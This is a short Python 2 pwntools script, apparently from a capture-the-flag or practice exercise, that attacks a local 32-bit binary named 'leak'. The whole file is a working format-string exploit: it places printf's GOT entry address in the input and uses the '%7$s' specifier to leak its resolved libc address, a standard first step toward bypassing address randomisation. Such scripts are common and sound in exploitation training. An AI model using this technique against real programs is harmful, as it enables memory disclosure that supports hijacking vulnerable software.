#32bit leak
from pwn import *
context.log_level = "debug"
p = process("./leak")
e = ELF("./leak")

printf_got = e.got["printf"]
payload = p32(printf_got)+"%7$s"

p.sendline(payload)
print p.recv()
